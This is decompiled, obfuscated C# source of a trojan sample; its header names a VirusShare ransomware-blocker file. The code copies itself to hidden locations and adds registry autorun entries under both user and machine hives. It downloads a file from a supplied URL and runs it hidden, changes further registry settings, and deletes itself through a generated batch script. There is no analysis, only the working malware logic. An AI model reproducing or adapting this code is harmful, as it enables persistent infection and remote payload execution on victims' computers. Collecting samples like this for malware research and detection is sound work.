// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2EAA04FB-4A12-46FB-89C9-8F20DEF80030
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.heqk-a676fa6fd1e5c420949ebe87d886c57cc8693a1c182562bacd2c8a70cf0dc574.exe

using \u0003;
using \u0005;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0005
{
  internal class \u0008
  {
    private Mutex \u0001;

    public void \u0081()
    {
      this.\u0082();
      this.\u0089();
      this.\u0083();
    }

    private void \u0082()
    {
      try
      {
        this.\u0001 = new Mutex(true, \u0015.\u0001.\u0019);
        this.\u0001.ReleaseMutex();
      }
      catch
      {
        Environment.Exit(-1);
      }
    }

    private void \u0083()
    {
      string fileName = Process.GetCurrentProcess().MainModule.FileName;
      if (this.\u0087())
        return;
      try
      {
        foreach (string str in \u0015.\u0001.\u007F)
        {
          if (!\u0015.\u0002.\u0097(str))
            System.IO.File.Copy(fileName, str);
          System.IO.File.SetAttributes(str, FileAttributes.Hidden);
        }
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0002.\u001C(677), true).SetValue(\u0015.\u0001.\u0016[0], (object) ('"'.ToString() + \u0015.\u0001.\u007F[0] + (object) '"'));
        Registry.LocalMachine.OpenSubKey(\u0002.\u001C(677), true).SetValue(\u0015.\u0001.\u0016[1], (object) ('"'.ToString() + \u0015.\u0001.\u007F[1] + (object) '"'));
      }
      catch
      {
      }
      try
      {
        this.\u0001.Close();
        foreach (string str in \u0015.\u0001.\u007F)
          new Process()
          {
            StartInfo = {
              FileName = str,
              WindowStyle = ProcessWindowStyle.Hidden
            }
          }.Start();
      }
      catch
      {
      }
      Environment.Exit(-1);
    }

    public void \u0084([In] string obj0)
    {
      try
      {
        this.\u0001.Close();
      }
      catch
      {
      }
      try
      {
        string str = \u0015.\u0002.\u0096(new Random().Next(5, 12)) + \u0002.\u001C(220);
        new WebClient().DownloadFile(obj0, Environment.GetEnvironmentVariable(\u0002.\u001C(229)) + \u0002.\u001C(238) + str);
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable(\u0002.\u001C(229)) + \u0002.\u001C(238) + str),
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch
      {
      }
      this.\u0088();
      Environment.Exit(-1);
    }

    public void \u0086()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0002.\u001C(677), true).DeleteValue(\u0015.\u0001.\u0016[0]);
        Registry.LocalMachine.OpenSubKey(\u0002.\u001C(677), true).DeleteValue(\u0015.\u0001.\u0016[1]);
      }
      catch
      {
      }
      try
      {
        foreach (string path in \u0015.\u0001.\u007F)
          System.IO.File.Delete(path);
      }
      catch
      {
      }
      this.\u0088();
      Environment.Exit(-1);
    }

    private bool \u0087()
    {
      string[] strArray = \u0015.\u0001.\u007F;
      int index = 0;
      if (index < strArray.Length)
      {
        string str = strArray[index];
        if (!\u0015.\u0002.\u0097(str))
          return false;
      }
      return true;
    }

    private void \u0088()
    {
      try
      {
        string str = \u0002.\u001C(738) + (object) '"' + Environment.GetCommandLineArgs()[0] + (object) '"' + \u0002.\u001C(751) + (object) '"' + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + (object) '"' + \u0002.\u001C(768);
        TextWriter textWriter = (TextWriter) new StreamWriter(Environment.GetEnvironmentVariable(\u0002.\u001C(229)) + \u0002.\u001C(781));
        textWriter.WriteLine(str);
        textWriter.Close();
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable(\u0002.\u001C(229)) + \u0002.\u001C(781)),
            UseShellExecute = false,
            CreateNoWindow = true
          }
        }.Start();
      }
      catch
      {
      }
    }

    private void \u0089()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0002.\u001C(798), true).SetValue(\u0002.\u001C(879), (object) \u0002.\u001C(888), RegistryValueKind.DWord);
      }
      catch
      {
      }
      if (!\u0015.\u0001.\u001C)
        return;
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0002.\u001C(798), true).SetValue(\u0002.\u001C(893), (object) \u0002.\u001C(918), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0002.\u001C(923), true).SetValue(\u0002.\u001C(1000), (object) \u0002.\u001C(918), RegistryValueKind.DWord);
        Registry.LocalMachine.OpenSubKey(\u0002.\u001C(923), true).SetValue(\u0002.\u001C(1000), (object) \u0002.\u001C(918), RegistryValueKind.DWord);
      }
      catch
      {
      }
    }
  }
}
